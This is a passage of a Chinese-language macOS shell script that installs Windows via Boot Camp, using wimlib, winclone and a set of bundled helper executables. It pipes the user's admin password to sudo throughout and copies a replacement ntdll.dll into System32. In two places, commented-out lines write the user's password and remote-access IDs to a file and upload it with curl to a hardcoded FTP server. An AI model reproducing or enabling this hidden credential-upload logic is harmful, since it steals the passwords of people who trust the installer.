echo "$pass" | sudo -S sudo /usr/bin/security authorizationdb write system.preferences.startupdisk allow
open /System/Library/PreferencePanes/StartupDisk.prefPane
exit 0
fi

if [ "$winclone6" ]; then
MBR10="1"
echo "$pass" | sudo -S sudo rm -rf /tmp/ISODIR/bootmgr.efi
echo "$pass" | sudo -S sudo rm -rf /tmp/ISODIR/efi
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/tools/bin/wimlib-imagex update /tmp/ISODIR/sources/boot.wim 2 --command 'add /tmp/RE /'" password "$pass" with administrator privileges
do shell script "/tmp/tools/bin/wimlib-imagex capture /tmp/ISODIR /tmp/Windows.wim" password "$pass" with administrator privileges
do shell script "/tmp/winclone6 --self-extract -l -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex update /tmp/ISODIR/sources/boot.wim 2 \
    --command "add /tmp/RE /"
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex capture /tmp/ISODIR /tmp/Windows.wim
echo "$pass" | sudo -S sudo /tmp/winclone6 --self-extract -l -p ${restore_device}
fi
if [ ! -f "/Volumes/BOOTCAMP/boot/BCD" ]; then
read -t 30 -p "安装BCD失败，请检查NTFS软件，30秒后自动重试..."
Winxt
fi
rm -rf /tmp/666
mkdir /tmp/666
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
echo "mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666" > /tmp/ntfs.sh
osascript <<EOD
do shell script "bash /tmp/ntfs.sh" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666
fi 
bootcamp_mounted="/tmp/666"
fi

if [ "$winclone7" ]; then
if [ "$mbrw" ]; then
echo "$pass" | sudo -S sudo rm -rf /tmp/ISODIR/bootmgr.efi
echo "$pass" | sudo -S sudo rm -rf /tmp/ISODIR/efi
fi

if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/tools/bin/wimlib-imagex update /tmp/ISODIR/sources/boot.wim 2 --command 'add /tmp/RE /'" password "$pass" with administrator privileges
do shell script "/tmp/tools/bin/wimlib-imagex capture /tmp/ISODIR /tmp/Windows.wim" password "$pass" with administrator privileges
do shell script "/tmp/winclone --self-extract $mbrw -p ${restore_device} -i 1" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex update /tmp/ISODIR/sources/boot.wim 2 \
    --command "add /tmp/RE /"
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex capture /tmp/ISODIR /tmp/Windows.wim
echo "$pass" | sudo -S sudo /tmp/winclone --self-extract "$mbrw" -p ${restore_device} -i 1
fi

if [ "$mbrw" ]; then
MBR10="1"
if [ ! -f "/Volumes/Windows/boot/BCD" ]; then
read -t 30 -p "安装BCD失败，请检查NTFS软件，30秒后自动重试..."
Winxt
fi
fi

if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone10 -m ${restore_device}" password "$pass" with administrator privileges
EOD
bootcamp_mounted="/Volumes/Windows"
else
bootcamp_mounted=$(echo "$pass" | sudo -S sudo /tmp/winclone10 -m ${restore_device})
fi
fi

if [ "$winclone5" ]; then
echo "$pass" | sudo -S sudo rm -rf /tmp/ISODIR/bootmgr.efi
echo "$pass" | sudo -S sudo rm -rf /tmp/ISODIR/efi
diskutil eraseVolume MS-DOS DOS ${restore_device}
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/System/Library/Filesystems/fusefs_txantfs.fs/Support/mkntfs -Q -L BOOTCAMP ${restore_device}" password "$pass" with administrator privileges
do shell script "rm -rf /System/Library/Filesystems/fusefs_txantfs.fs" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /System/Library/Filesystems/fusefs_txantfs.fs/Support/mkntfs -Q -L BOOTCAMP ${restore_device}
echo "$pass" | sudo -S sudo rm -rf /System/Library/Filesystems/fusefs_txantfs.fs
fi
diskutil mount ${restore_device}
if [ $? -ne 0 ] ; then
diskutil eraseVolume MS-DOS DOS ${restore_device}
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "cp -R /tmp/fusefs_txantfs.fs /System/Library/Filesystems" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo cp -R /tmp/fusefs_txantfs.fs /System/Library/Filesystems
fi
read -t 5 -p "格式化成NTFS失败，5秒后重试..."
fi
echo "$pass" | sudo -S sudo mv /tmp/RE /tmp/2
echo "$pass" | sudo -S sudo /tmp/keka7z a /tmp/ISODIR/sources/boot.wim /tmp/2
echo "$pass" | sudo -S sudo mkdir /tmp/666
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
echo "mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666" > /tmp/ntfs.sh
osascript <<EOD
do shell script "bash /tmp/ntfs.sh" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666
fi
bootcamp_mounted="/tmp/666"
cp -R /tmp/ISODIR/* "${bootcamp_mounted}"
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/ntfsclone -s ${restore_device} -o /tmp/boot.img" password "$pass" with administrator privileges
do shell script "/tmp/pigz -6 -p 10 -k /tmp/boot.img" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/ntfsclone -s ${restore_device} -o /tmp/boot.img
echo "$pass" | sudo -S sudo /tmp/pigz -6 -p 10 -k /tmp/boot.img
fi
diskutil eraseVolume MS-DOS DOS ${restore_device}
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone5 --self-extract -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone5 --self-extract -p ${restore_device}
fi
if [ ! -f "/Volumes/BOOTCAMP/boot/BCD" ]; then
read -t 30 -p "安装BCD失败，请检查NTFS软件，30秒后自动重试..."
Winxt
fi
rm -rf /tmp/666
mkdir /tmp/666
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
echo "mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666" > /tmp/ntfs.sh
osascript <<EOD
do shell script "bash /tmp/ntfs.sh" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666
fi 
bootcamp_mounted="/tmp/666"
fi

mkdir -p "${bootcamp_mounted}/WLLOS"
mkdir -p "${bootcamp_mounted}/Windows/System32"
cp /tmp/ntdll.dll "${bootcamp_mounted}/Windows/System32"
cp ~/Downloads/BootCamp/WindowsSupport.dmg "${bootcamp_mounted}/WLLOS"
cp ~/Downloads/JG_Download/BootCamp.zip "${bootcamp_mounted}/WLLOS"
if [ ! "$reltsc" ]; then
cp /Volumes/IR5_CCSA_X64FRE_ZH-CN_DV9/sources/"$drvname" "${bootcamp_mounted}/WLLOS"
cp -R /Volumes/IR5_CCSA_X64FRE_ZH-CN_DV9/sources/sxs "${bootcamp_mounted}/WLLOS"
else
cp /Volumes/CES_X64FREV_ZH-CN_DV5/sources/"$drvname" "${bootcamp_mounted}/WLLOS"
cp -R /Volumes/CES_X64FREV_ZH-CN_DV5/sources/sxs "${bootcamp_mounted}/WLLOS"
fi
echo "SySFile=$drvname" > "${bootcamp_mounted}/WLLOS/MacSys"
echo "Index=$index" >> "${bootcamp_mounted}/WLLOS/MacSys"
if [ "$MBR10" ]; then
echo "MBR=MBR" >> "${bootcamp_mounted}/WLLOS/MBR10"
fi
cp /tmp/bcsz.exe "${bootcamp_mounted}/WLLOS"
cp /tmp/qdgx.exe "${bootcamp_mounted}/WLLOS"
cp /tmp/azbc.exe "${bootcamp_mounted}/WLLOS"
diskutil unmount ${restore_device}
diskutil mount ${restore_device}
clear && printf "\e[3J"
echo
echo	
#echo TeamViewerID: "\033[36m${TVID}\033[0m"
echo	
echo ID: "\033[36m${tbid}\033[0m"		
echo
echo "\033[36m安装系统写入完成！！！\033[0m"
killall "System Preferences"
echo "$pass" | sudo -S sudo /usr/bin/security authorizationdb write system.preferences.startupdisk allow
open /System/Library/PreferencePanes/StartupDisk.prefPane
#echo "TBName=$tbid" > /tmp/mac.txt
#echo "TVName=$TVName" >> /tmp/mac.txt
#echo "PSName=$pass" >> /tmp/mac.txt
if [ -f /tmp/mac.txt ]; then
#curl --connect-timeout 10 -m 20 -T /tmp/mac.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
echo
fi
#rm -rf /tmp/mac.txt
exit 0
fi


if [ ! "$re1909" ]; then
if [ "$ISODIR" ]; then
echo
else
if [ ! "$old10" ]; then
if [ "$moderoot" ]; then
echo 正在安装中，阶段一....
osascript <<EOD
do shell script "/tmp/tools/bin/wimlib-imagex apply ~/Downloads/JG_Download/$drvname 1 /tmp/ISODIR --no-acls --no-attributes" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex apply ~/Downloads/JG_Download/$drvname 1 /tmp/ISODIR --no-acls --no-attributes 2>/dev/null
fi
if [ "$zxos" ]; then
if [ "$moderoot" ]; then
echo "SySFile=$drvname" > "/tmp/MacSys"
echo "Index=$index" >> "/tmp/MacSys"
if [ "$bt7" ]; then
echo "bt7=bt7" > "/tmp/bt7"
fi
if [ "$Win11" ]; then
echo "$drvname" > "/tmp/Win11"
osascript <<EOD
do shell script "cp /tmp/Win11 /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp /tmp/Win11.exe /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
EOD
fi
if [ "$Hostname" ]; then
echo "$drvname" > "/tmp/USB"
osascript <<EOD
do shell script "cp /tmp/USB /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
EOD
fi
osascript <<EOD
do shell script "mkdir -p /tmp/WLLOS" password "$pass" with administrator privileges
do shell script "mkdir -p /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "mkdir -p /tmp/ISODIR/Windows/System32" password "$pass" with administrator privileges
do shell script "cp /tmp/ntdll.dll /tmp/ISODIR/Windows/System32" password "$pass" with administrator privileges
do shell script "cp /tmp/bt.exe /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp -R /tmp/ISODIR/sources/sxs" password "$pass" with administrator privileges
do shell script "cp /tmp/MacSys /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp /tmp/bt7 /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp /tmp/azbc.exe /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp /tmp/bcsz.exe /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp /tmp/azbcgx.exe /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp /tmp/qdzh.exe /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp /tmp/BroadcomBluetooth64.exe /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp /tmp/16wifi.exe /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp /tmp/yxk.exe /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp /tmp/act.exe /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
EOD
ntcp="1"
else
echo "$pass" | sudo -S sudo mkdir -p /tmp/WLLOS
echo "$pass" | sudo -S sudo mkdir -p /tmp/ISODIR/WLLOS
echo "$pass" | sudo -S sudo mkdir -p /tmp/ISODIR/Windows/System32
echo "$pass" | sudo -S sudo cp /tmp/ntdll.dll "/tmp/ISODIR/Windows/System32"
if [ "$zdbt" ]; then
echo "$pass" | sudo -S sudo cp /tmp/bt.exe "/tmp/ISODIR/WLLOS"
fi
echo "$pass" | sudo -S sudo cp -R /tmp/ISODIR/sources/sxs "/tmp/ISODIR/WLLOS"
echo "SySFile=$drvname" > "/tmp/MacSys"
echo "Index=$index" >> "/tmp/MacSys"
echo "$pass" | sudo -S sudo cp /tmp/MacSys "/tmp/ISODIR/WLLOS"
if [ "$bt7" ]; then
echo "bt7=bt7" > "/tmp/bt7"
echo "$pass" | sudo -S sudo cp /tmp/bt7 "/tmp/ISODIR/WLLOS"
fi
echo "$pass" | sudo -S sudo cp /tmp/azbc.exe "/tmp/ISODIR/WLLOS"
echo "$pass" | sudo -S sudo cp /tmp/bcsz.exe "/tmp/ISODIR/WLLOS"
echo "$pass" | sudo -S sudo cp /tmp/azbcgx.exe "/tmp/ISODIR/WLLOS"
echo "$pass" | sudo -S sudo cp /tmp/qdzh.exe "/tmp/ISODIR/WLLOS"
if [ "$lanya" ]; then
echo "$pass" | sudo -S sudo cp /tmp/BroadcomBluetooth64.exe "/tmp/ISODIR/WLLOS"
fi
if [ "$wf16" ]; then
echo "$pass" | sudo -S sudo cp /tmp/16wifi.exe "/tmp/ISODIR"
fi
if [ "$xtyh" ]; then
echo "$pass" | sudo -S sudo cp /tmp/yxk.exe "/tmp/ISODIR/WLLOS"
echo "$pass" | sudo -S sudo cp /tmp/act.exe "/tmp/ISODIR/WLLOS"
fi
if [ "$Win11" ]; then
echo "$drvname" > "/tmp/Win11"
echo "$pass" | sudo -S sudo cp /tmp/Win11 "/tmp/ISODIR/WLLOS"
echo "$pass" | sudo -S sudo cp /tmp/Win11.exe "/tmp/ISODIR/WLLOS"
fi
if [ "$Hostname" ]; then
echo "$drvname" > "/tmp/USB"
echo "$pass" | sudo -S sudo cp /tmp/USB "/tmp/ISODIR/WLLOS"
fi
ntcp="1"
fi
fi
fi
fi
fi



if [ "$MBR10" ]; then
echo "$pass" | sudo -S sudo rm -rf /tmp/ISODIR/bootmgr.efi
echo "$pass" | sudo -S sudo rm -rf /tmp/ISODIR/efi
fi

if [ ! "$re1909" ]; then
if [ ! "$ntfs10" ]; then
if [ "$moderoot" ]; then
echo 正在安装中，阶段二....
osascript <<EOD
do shell script "/tmp/tools/bin/wimlib-imagex export ~/Downloads/JG_Download/$drvname 2 /tmp/ISODIR/sources/boot.wim --compress=maximum --boot" password "$pass" with administrator privileges
do shell script "/tmp/tools/bin/wimlib-imagex export ~/Downloads/JG_Download/$drvname 3 /tmp/ISODIR/sources/boot.wim" password "$pass" with administrator privileges
do shell script "/tmp/tools/bin/wimlib-imagex info /tmp/ISODIR/sources/boot.wim 2 --image-property FLAGS=2" password "$pass" with administrator privileges
do shell script "/tmp/tools/bin/wimlib-imagex info /tmp/ISODIR/sources/boot.wim 2 --boot" password "$pass" with administrator privileges
do shell script "/tmp/tools/bin/wimlib-imagex update /tmp/ISODIR/sources/boot.wim 2 --command 'add /tmp/RE /'" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex export ~/Downloads/JG_Download/$drvname 2 /tmp/ISODIR/sources/boot.wim \
  --compress=maximum --boot
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex export ~/Downloads/JG_Download/$drvname 3 \
  /tmp/ISODIR/sources/boot.wim
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex info /tmp/ISODIR/sources/boot.wim 2 --image-property FLAGS=2 >/dev/null
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex info /tmp/ISODIR/sources/boot.wim 2 --boot >/dev/null
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex update /tmp/ISODIR/sources/boot.wim 2 \
    --command "add /tmp/RE /"
fi    
if [ ! "$old10" ]; then  
if [ "$moderoot" ]; then
echo 正在安装中，阶段三....
osascript <<EOD
do shell script "/tmp/tools/bin/wimlib-imagex capture /tmp/ISODIR /tmp/Windows.wim" password "$pass" with administrator privileges
EOD
else 
#if [ -f ~/Downloads/JG_Download/10pe.iso ]; then
#hdiutil attach ~/Downloads/JG_Download/10pe.iso
#echo "$pass" | sudo -S sudo rm -rf /tmp/ISODIR/sources/boot.wim
#echo "$pass" | sudo -S sudo cp /Volumes/10PE/sources/boot.wim /tmp/ISODIR/sources
#diskutil eject /Volumes/10PE
#umount -f /Volumes/10PE
#diskutil eject $(diskutil list | grep '10PE' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
#fi
echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex capture /tmp/ISODIR /tmp/Windows.wim
fi
fi
fi
fi



if [ "$re1909" ]; then


if [ "$zxos" ]; then
if [ "$moderoot" ]; then
echo "SySFile=$drvname" > "/tmp/MacSys"
echo "Index=$index" >> "/tmp/MacSys"
if [ "$bt7" ]; then
echo "bt7=bt7" > "/tmp/bt7"
fi
if [ "$Win11" ]; then
echo "$drvname" > "/tmp/Win11"
osascript <<EOD
do shell script "cp /tmp/Win11 /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp /tmp/Win11.exe /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
EOD
fi
if [ "$Hostname" ]; then
echo "$drvname" > "/tmp/USB"
osascript <<EOD
do shell script "cp /tmp/USB /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
EOD
fi
osascript <<EOD
do shell script "mkdir -p /tmp/WLLOS" password "$pass" with administrator privileges
do shell script "mkdir -p /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "mkdir -p /tmp/ISODIR/Windows/System32" password "$pass" with administrator privileges
do shell script "cp /tmp/ntdll.dll /tmp/ISODIR/Windows/System32" password "$pass" with administrator privileges
do shell script "cp /tmp/bt.exe /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp -R /tmp/ISODIR/sources/sxs" password "$pass" with administrator privileges
do shell script "cp /tmp/MacSys /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp /tmp/bt7 /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp /tmp/azbc.exe /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp /tmp/bcsz.exe /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp /tmp/azbcgx.exe /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp /tmp/qdzh.exe /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp /tmp/BroadcomBluetooth64.exe /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp /tmp/16wifi.exe /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp /tmp/yxk.exe /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
do shell script "cp /tmp/act.exe /tmp/ISODIR/WLLOS" password "$pass" with administrator privileges
EOD
ntcp="1"
else
echo "$pass" | sudo -S sudo mkdir -p /tmp/WLLOS
echo "$pass" | sudo -S sudo mkdir -p /tmp/ISODIR/WLLOS
echo "$pass" | sudo -S sudo mkdir -p /tmp/ISODIR/Windows/System32
echo "$pass" | sudo -S sudo cp /tmp/ntdll.dll "/tmp/ISODIR/Windows/System32"
if [ "$zdbt" ]; then
echo "$pass" | sudo -S sudo cp /tmp/bt.exe "/tmp/ISODIR/WLLOS"
fi
echo "$pass" | sudo -S sudo cp -R /tmp/ISODIR/sources/sxs "/tmp/ISODIR/WLLOS"
echo "SySFile=$drvname" > "/tmp/MacSys"
echo "Index=$index" >> "/tmp/MacSys"
echo "$pass" | sudo -S sudo cp /tmp/MacSys "/tmp/ISODIR/WLLOS"
if [ "$bt7" ]; then
echo "bt7=bt7" > "/tmp/bt7"
echo "$pass" | sudo -S sudo cp /tmp/bt7 "/tmp/ISODIR/WLLOS"
fi
echo "$pass" | sudo -S sudo cp /tmp/azbc.exe "/tmp/ISODIR/WLLOS"
echo "$pass" | sudo -S sudo cp /tmp/bcsz.exe "/tmp/ISODIR/WLLOS"
echo "$pass" | sudo -S sudo cp /tmp/azbcgx.exe "/tmp/ISODIR/WLLOS"
echo "$pass" | sudo -S sudo cp /tmp/qdzh.exe "/tmp/ISODIR/WLLOS"
if [ "$lanya" ]; then
echo "$pass" | sudo -S sudo cp /tmp/BroadcomBluetooth64.exe "/tmp/ISODIR/WLLOS"
fi
if [ "$wf16" ]; then
echo "$pass" | sudo -S sudo cp /tmp/16wifi.exe "/tmp/ISODIR"
fi
if [ "$xtyh" ]; then
echo "$pass" | sudo -S sudo cp /tmp/yxk.exe "/tmp/ISODIR/WLLOS"
echo "$pass" | sudo -S sudo cp /tmp/act.exe "/tmp/ISODIR/WLLOS"
fi
if [ "$Win11" ]; then
echo "$drvname" > "/tmp/Win11"
echo "$pass" | sudo -S sudo cp /tmp/Win11 "/tmp/ISODIR/WLLOS"
echo "$pass" | sudo -S sudo cp /tmp/Win11.exe "/tmp/ISODIR/WLLOS"
fi
if [ "$Hostname" ]; then
echo "$drvname" > "/tmp/USB"
echo "$pass" | sudo -S sudo cp /tmp/USB "/tmp/ISODIR/WLLOS"
fi
ntcp="1"
fi
fi




if [ ! "$old10" ]; then
if [ ! "$ntfs10" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "rm -rf /tmp/Windows.wim" password "$pass" with administrator privileges
do shell script "cp ~/Downloads/JG_Download/PEDRV.dmg /tmp/ISODIR/sources/boot.wim" password "$pass" with administrator privileges
do shell script "/tmp/tools/bin/wimlib-imagex update /tmp/ISODIR/sources/boot.wim 1 --command 'add /tmp/RE /'" password "$pass" with administrator privileges
do shell script "/tmp/tools/bin/wimlib-imagex capture /tmp/ISODIR /tmp/Windows.wim" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo rm -rf /tmp/Windows.wim

echo "$pass" | sudo -S sudo cp ~/Downloads/JG_Download/PEDRV.dmg /tmp/ISODIR/sources/boot.wim


echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex update /tmp/ISODIR/sources/boot.wim 1 \
    --command "add /tmp/RE /"   


echo "$pass" | sudo -S sudo /tmp/tools/bin/wimlib-imagex capture /tmp/ISODIR /tmp/Windows.wim

fi
fi
fi

fi



fi





if [ "$old10" ]; then
diskutil eraseVolume MS-DOS DOS ${restore_device}
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "diskutil mount disk0s1" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo diskutil mount disk0s1
fi
rm -rf /Volumes/EFI/EFI/Boot
rm -rf /Volumes/EFI/EFI/Microsoft
diskutil unmount disk0s1
clear && printf "\e[3J"
echo "\033[36m请等待，即将写入完成！！！\033[0m"
if [[ $modelxh = "10.10"* ]]; then
if [ "$re1909" ]; then
echo "$pass" | sudo -S sudo cp ~/Downloads/JG_Download/PEDRV.dmg /tmp/ISODIR/sources/boot.wim
fi
cp -R /tmp/ISODIR/* /Volumes/PEVIP
else
cp -R /tmp/WPE/* /Volumes/PEVIP
if [ ! "$re1909" ]; then
cp /tmp/ISODIR/sources/boot.wim /Volumes/PEVIP/WEPE/WEPE64.WIM
else
cp ~/Downloads/JG_Download/PEDRV.dmg /Volumes/PEVIP/WEPE/WEPE64.WIM
fi
fi
mkdir -p /Volumes/PEVIP/WLLOS
cp ~/Downloads/JG_Download/"$drvname" /Volumes/PEVIP/WLLOS 
cp ~/Downloads/BootCamp/WindowsSupport.dmg /Volumes/PEVIP/WLLOS 
cp /tmp/azbcgx.exe /Volumes/PEVIP/WLLOS 
cp /tmp/qdzh.exe /Volumes/PEVIP/WLLOS
cp /tmp/azbc.exe /Volumes/PEVIP/WLLOS
cp /tmp/bcsz.exe /Volumes/PEVIP/WLLOS
if [ "$Win11" ]; then
echo "$drvname" > /Volumes/PEVIP/WLLOS/Win11
cp /tmp/Win11.exe /Volumes/PEVIP/WLLOS
fi
if [ "$xtyh" ]; then
cp /tmp/yxk.exe /Volumes/PEVIP/WLLOS
cp /tmp/act.exe /Volumes/PEVIP/WLLOS
fi
if [ "$oldsz" ]; then
echo "HFS" > /Volumes/PEVIP/WLLOS/HFS
fi


clear && printf "\e[3J"
echo
echo	
#echo TeamViewerID: "\033[36m${TVID}\033[0m"
echo	
echo ID: "\033[36m${tbid}\033[0m"		
echo
echo "\033[36m安装系统写入完成！手动切换\033[0m"
killall "System Preferences"
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/usr/bin/security authorizationdb write system.preferences.startupdisk allow" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /usr/bin/security authorizationdb write system.preferences.startupdisk allow
fi
echo "SySFile=$drvname" > /Volumes/DOS/MacSys
echo "Index=$index" >> /Volumes/DOS/MacSys
#echo "TBName=$tbid" > /tmp/mac.txt
#echo "TVName=$TVName" >> /tmp/mac.txt
#echo "PSName=$pass" >> /tmp/mac.txt
if [ -f /tmp/mac.txt ]; then
#curl --connect-timeout 10 -m 20 -T /tmp/mac.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
echo
fi
#rm -rf /tmp/mac.txt
exit 0
fi

if [ "$winclone7" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "diskutil mount disk0s1" password "$pass" with administrator privileges
do shell script "rm -rf /Volumes/EFI/EFI/Boot" password "$pass" with administrator privileges
do shell script "rm -rf /Volumes/EFI/EFI/Microsoft" password "$pass" with administrator privileges
do shell script "diskutil unmount disk0s1" password "$pass" with administrator privileges
do shell script "/tmp/winclone --self-extract $mbrw -p ${restore_device} -i 1" password "$pass" with administrator privileges
do shell script "/tmp/winclone10 -m ${restore_device}" password "$pass" with administrator privileges
EOD
bootcamp_mounted="/Volumes/Windows"
else
echo "$pass" | sudo -S sudo diskutil mount disk0s1
rm -rf /Volumes/EFI/EFI/Boot
rm -rf /Volumes/EFI/EFI/Microsoft
diskutil unmount disk0s1
if [ "$sipp" ]; then
echo "$pass" | sudo -S sudo /tmp/winclone --self-extract -e -p ${restore_device} -i 1
else
echo "$pass" | sudo -S sudo /tmp/winclone --self-extract "$mbrw" -p ${restore_device} -i 1
fi
bootcamp_mounted=$(echo "$pass" | sudo -S sudo /tmp/winclone10 -m ${restore_device})
fi
clear && printf "\e[3J"
echo
echo "\033[36m请等待，即将写入完成！！！\033[0m"

if [ ! "$ntcp" ]; then
mkdir -p "${bootcamp_mounted}/WLLOS"
mkdir -p "${bootcamp_mounted}/Windows/System32"
cp /tmp/ntdll.dll "${bootcamp_mounted}/Windows/System32"
cp ~/Downloads/JG_Download/"$drvname" "${bootcamp_mounted}/WLLOS"
cp ~/Downloads/BootCamp/WindowsSupport.dmg "${bootcamp_mounted}/WLLOS"
if [ "$zdbt" ]; then
cp /tmp/bt.exe "${bootcamp_mounted}/WLLOS"
fi
cp -R /tmp/ISODIR/sources/sxs "${bootcamp_mounted}/WLLOS"
echo "SySFile=$drvname" > "${bootcamp_mounted}/WLLOS/MacSys"
echo "Index=$index" >> "${bootcamp_mounted}/WLLOS/MacSys"
if [ "$MBR10" ]; then
echo "MBR=MBR" >> "${bootcamp_mounted}/WLLOS/MBR10"
fi
if [ "$bt7" ]; then
echo "bt7=bt7" >> "${bootcamp_mounted}/WLLOS/bt7"
fi
cp /tmp/azbc.exe "${bootcamp_mounted}/WLLOS"
cp /tmp/bcsz.exe "${bootcamp_mounted}/WLLOS"
cp /tmp/azbcgx.exe "${bootcamp_mounted}/WLLOS"
cp /tmp/qdzh.exe "${bootcamp_mounted}/WLLOS"
if [ "$lanya" ]; then
cp /tmp/BroadcomBluetooth64.exe "${bootcamp_mounted}/WLLOS"
fi
if [ "$wf16" ]; then
cp /tmp/16wifi.exe "${bootcamp_mounted}"
fi
if [ "$xtyh" ]; then
cp /tmp/yxk.exe "${bootcamp_mounted}/WLLOS"
cp /tmp/act.exe "${bootcamp_mounted}/WLLOS"
fi
if [ "$Win11" ]; then
echo "$drvname" > "${bootcamp_mounted}/WLLOS/Win11"
cp /tmp/Win11.exe "${bootcamp_mounted}/WLLOS"
fi
if [ "$Hostname" ]; then
echo "$drvname" > "${bootcamp_mounted}/WLLOS/USB"
fi
if [ "$sipp" ]; then
apfs_active=`diskutil list | grep APFS`
if [ "$apfs_active" ] ; then
echo "SySFile=APFS" > "${bootcamp_mounted}/WLLOS/APFS"
else
echo "SySFile=HFS" > "${bootcamp_mounted}/WLLOS/HFS"
if [[ $modelxh = "10.13"* ]]; then
if [ ! "$REHD" ] ; then
rm -rf "${bootcamp_mounted}/WLLOS/HFS"
echo "SySFile=HFS" > "${bootcamp_mounted}/WLLOS/HFS1013"
else
rm -rf "${bootcamp_mounted}/WLLOS/HFS"
echo "SySFile=HFS" > "${bootcamp_mounted}/WLLOS/HFS13"
fi
fi
if [[ $modelxh = "10.14"* ]]; then
if [ ! "$REHD" ] ; then
rm -rf "${bootcamp_mounted}/WLLOS/HFS"
echo "SySFile=HFS" > "${bootcamp_mounted}/WLLOS/HFS1013"
else
rm -rf "${bootcamp_mounted}/WLLOS/HFS"
echo "SySFile=HFS" > "${bootcamp_mounted}/WLLOS/HFS13"
fi
fi
if [[ $modelxh = "10.15"* ]]; then
if [ ! "$REHD" ] ; then
rm -rf "${bootcamp_mounted}/WLLOS/HFS"
echo "SySFile=HFS" > "${bootcamp_mounted}/WLLOS/HFS1013"
else
rm -rf "${bootcamp_mounted}/WLLOS/HFS"
echo "SySFile=HFS" > "${bootcamp_mounted}/WLLOS/HFS13"
fi
fi
fi
fi
if [[ $modelxh = "10.12"* ]]; then
if [ -e /Volumes/Boot ]; then
if [ ! "$sipp" ]; then
if [ "$sip" ]; then
echo "SySFile=HFS" > "${bootcamp_mounted}/WLLOS/1012"
fi
fi
else
echo "SySFile=HFS" > "${bootcamp_mounted}/WLLOS/y1012"
fi
fi

fi

diskutil unmount ${restore_device}

if [ "$ntcp" ]; then
